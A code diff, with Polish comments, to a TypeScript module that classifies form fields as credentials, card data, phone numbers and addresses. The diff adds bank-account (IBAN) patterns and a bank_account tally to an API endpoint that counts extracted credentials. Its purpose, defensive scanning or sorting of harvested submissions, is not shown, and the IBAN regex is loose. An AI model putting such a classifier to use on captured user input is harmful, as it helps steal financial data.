@@ -47,6 +47,16 @@ const CREDENTIAL_PATTERNS = {
         /cvc/i,
         /expir/i,
     ],
+    // Numery kont bankowych (IBAN)
+    bank_account: [
+        /iban/i,
+        /bank.*account/i,
+        /account.*number/i,
+        /konto/i,
+        /numer.*konta/i,
+        /rachunek/i,
+        /nr.*konta/i,
+    ],
     // Adresy
     address: [
         /address/i,
@@ -78,6 +88,9 @@ const VALUE_PATTERNS = {
     email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
     phone: /^\+?[\d\s\-()]{8,}$/,
     card: /^\d{13,19}$/,
+    // IBAN: 2 litery kraju + 2 cyfry kontrolne + do 30 znaków alfanumerycznych
+    // Polski IBAN: PL + 26 cyfr
+    bank_account: /^[A-Z]{2}\s?\d{2}[\s\d]{10,30}$/i,
 };
 
 interface ExtractedCredential {
@@ -99,6 +112,12 @@ interface ExtractedCredential {
 function classifyField(fieldName: string, fieldValue: string): { type: string; confidence: 'high' | 'medium' | 'low' } | null {
     const lowerName = fieldName.toLowerCase();
     const lowerValue = typeof fieldValue === 'string' ? fieldValue.toLowerCase() : '';
+    const cleanedValue = fieldValue.replace(/\s/g, '');
+
+    // Sprawdź wartość pod kątem numeru konta bankowego IBAN (wysokie prawdopodobieństwo)
+    if (VALUE_PATTERNS.bank_account.test(fieldValue) || VALUE_PATTERNS.bank_account.test(cleanedValue)) {
+        return { type: 'bank_account', confidence: 'high' };
+    }
 
     // Sprawdź wartość pod kątem emaila (wysokie prawdopodobieństwo)
     if (VALUE_PATTERNS.email.test(fieldValue)) {
@@ -106,7 +125,7 @@ function classifyField(fieldName: string, fieldValue: string): { type: string; c
     }
 
     // Sprawdź wartość pod kątem telefonu
-    if (VALUE_PATTERNS.phone.test(fieldValue.replace(/\s/g, ''))) {
+    if (VALUE_PATTERNS.phone.test(cleanedValue)) {
         if (CREDENTIAL_PATTERNS.phone.some(p => p.test(lowerName))) {
             return { type: 'phone', confidence: 'high' };
         }
@@ -135,6 +154,11 @@ function classifyField(fieldName: string, fieldValue: string): { type: string; c
     // Sprawdź nazwę pola dla kart
     if (CREDENTIAL_PATTERNS.card.some(p => p.test(lowerName))) {
         return { type: 'card', confidence: 'high' };
+    }
+
+    // Sprawdź nazwę pola dla kont bankowych
+    if (CREDENTIAL_PATTERNS.bank_account.some(p => p.test(lowerName))) {
+        return { type: 'bank_account', confidence: 'medium' };
     }
 
     // Sprawdź nazwę pola dla adresów
@@ -292,6 +316,7 @@ export async function GET(request: NextRequest) {
                 username: allCredentials.filter(c => c.credentialType === 'username').length,
                 phone: allCredentials.filter(c => c.credentialType === 'phone').length,
                 card: allCredentials.filter(c => c.credentialType === 'card').length,
+                bank_account: allCredentials.filter(c => c.credentialType === 'bank_account').length,
                 address: allCredentials.filter(c => c.credentialType === 'address').length,
                 personal: allCredentials.filter(c => c.credentialType === 'personal').length,
             },
